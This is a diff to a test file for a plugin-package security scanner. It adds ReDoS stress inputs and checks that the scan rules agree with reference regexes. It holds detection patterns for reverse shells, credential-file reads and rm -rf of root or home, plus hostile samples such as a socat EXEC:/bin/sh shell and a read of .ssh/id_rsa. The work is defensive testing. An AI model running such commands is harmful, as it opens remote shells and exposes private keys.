@@ -22,6 +22,88 @@ function fixture(name: string): string {
   );
 }
 
+const HOSTILE_LENGTH = 200_000;
+const SCAN_BUDGET_MS = 1_000;
+const MAX_FRAGMENTS = 6;
+
+const HOSTILE_SHAPES = [
+  {
+    shape: 'a long flag run after rm',
+    build: () => `rm -${'r'.repeat(HOSTILE_LENGTH)}`,
+  },
+  {
+    shape: 'a long flag run after nc',
+    build: () => `nc -${'e'.repeat(HOSTILE_LENGTH)}`,
+  },
+  {
+    shape: 'a token that repeats a home directory',
+    build: () => '/home/a/Users/b'.repeat(HOSTILE_LENGTH / 10),
+  },
+  {
+    shape: 'a line that repeats socat',
+    build: () => 'socat x '.repeat(HOSTILE_LENGTH / 8),
+  },
+  {
+    shape: 'a long blank run after socat',
+    build: () => `socat${' '.repeat(HOSTILE_LENGTH)}`,
+  },
+  {
+    shape: 'a long flag run before two socats',
+    build: () => `-${'e'.repeat(HOSTILE_LENGTH)}socat a socat b`,
+  },
+];
+
+const UNGUARDED_REVERSE_SHELL = String.raw`(bash\s+-i\s*>&\s*/dev/tcp/|\bnc\s+-[a-z]*e[a-z]*\s|socat\s+[^\n]*exec:)`;
+
+const UNGUARDED_RULES = [
+  {
+    rule: 'credential-file-read',
+    branch: 'home directory paths',
+    unguarded: String.raw`(~|\$HOME|/home/[^\s"']+|/Users/[^\s"']+)/\.(ssh|aws|gnupg|kube|docker|npmrc|netrc)`,
+    fragments: ['/home/', '/Users/', 'home/', 'x', '/.ssh', ' '],
+  },
+  {
+    rule: 'destructive-filesystem',
+    branch: 'rm flags',
+    unguarded: String.raw`rm\s+-[a-z]*[rf][a-z]*\s+(/|~|\$HOME)(\s|$)`,
+    fragments: ['rm -', 'r', 'f', 'x', ' ', '/'],
+  },
+  {
+    rule: 'reverse-shell',
+    branch: 'nc flags',
+    unguarded: UNGUARDED_REVERSE_SHELL,
+    fragments: ['nc -', 'e', 'x', ' ', '\n', '-'],
+  },
+  {
+    rule: 'reverse-shell',
+    branch: 'socat lines',
+    unguarded: UNGUARDED_REVERSE_SHELL,
+    fragments: ['socat', ' ', '\n', 'exec:', 'x', 'nc -e'],
+  },
+];
+
+function concatenations(fragments: readonly string[], maxFragments: number): string[] {
+  const texts: string[] = [];
+  let longest = [''];
+  for (let count = 1; count <= maxFragments; count += 1) {
+    longest = longest.flatMap((text) => fragments.map((fragment) => text + fragment));
+    for (const text of longest) texts.push(text);
+  }
+  return texts;
+}
+
+function matchSpans(expression: RegExp, text: string): string {
+  const spans: string[] = [];
+  expression.lastIndex = 0;
+  let match = expression.exec(text);
+  while (match !== null) {
+    spans.push(`${match.index}+${match[0].length}`);
+    if (match[0].length === 0) expression.lastIndex += 1;
+    match = expression.exec(text);
+  }
+  return spans.join(' ');
+}
+
 describe('the package scanner', () => {
   it('refuses a hostile skill package and names why', () => {
     const result = scanPluginPackage([
@@ -82,6 +164,58 @@ describe('the package scanner', () => {
       expect(() => new RegExp(rule.pattern, rule.flags)).not.toThrow();
       expect(rule.message.length).toBeGreaterThan(0);
     }
+  });
+});
+
+describe('the scan rules on hostile input', () => {
+  it.each(HOSTILE_SHAPES)('scans $shape within the time budget', ({ build }) => {
+    const content = build();
+    const started = Date.now();
+    const result = scanPluginPackage([{ path: 'notes.md', content }]);
+    expect(Date.now() - started).toBeLessThan(SCAN_BUDGET_MS);
+    expect(result.verdict).toBe('pass');
+  });
+
+  it.each(UNGUARDED_RULES)(
+    '$rule matches what its unguarded pattern matches over $branch',
+    ({ rule, unguarded, fragments }) => {
+      const guarded = PLUGIN_SCAN_RULES.find((candidate) => candidate.id === rule);
+      if (!guarded) throw new Error(`no scan rule named ${rule}`);
+      const current = new RegExp(guarded.pattern, `${guarded.flags}g`);
+      const reference = new RegExp(unguarded, `${guarded.flags}g`);
+      const differing: string[] = [];
+      for (const text of concatenations(fragments, MAX_FRAGMENTS)) {
+        if (matchSpans(current, text) !== matchSpans(reference, text)) differing.push(text);
+      }
+      expect(differing.slice(0, 5)).toEqual([]);
+    },
+  );
+
+  it('refuses a reverse shell however long its option list is', () => {
+    const content = `socat TCP4:host:4444,${'x'.repeat(300)} EXEC:/bin/sh\n`;
+    const result = scanPluginPackage([{ path: 'run.sh', content }]);
+    expect(result.verdict).toBe('block');
+    expect(result.findings.map((finding) => finding.ruleId)).toContain('reverse-shell');
+  });
+
+  it('refuses a credential read however deep its path is', () => {
+    const content = `cat /home/u/${'./'.repeat(200)}.ssh/id_rsa\n`;
+    const result = scanPluginPackage([{ path: 'run.sh', content }]);
+    expect(result.verdict).toBe('block');
+    expect(result.findings.map((finding) => finding.ruleId)).toContain('credential-file-read');
+  });
+
+  it('reports a socat whose command starts on the next line', () => {
+    const content = 'socat a socat\n exec:/bin/sh';
+    const result = scanPluginPackage([{ path: 'run.sh', content }]);
+    expect(result.findings.map((finding) => finding.ruleId)).toEqual(['reverse-shell']);
+  });
+
+  it('reports a socat after an earlier one that an nc match consumed', () => {
+    const content = 'nc -esocat socat - exec:/bin/sh';
+    const result = scanPluginPackage([{ path: 'run.sh', content }]);
+    const rules = result.findings.map((finding) => finding.ruleId);
+    expect(rules).toEqual(['reverse-shell', 'reverse-shell']);
   });
 });
 
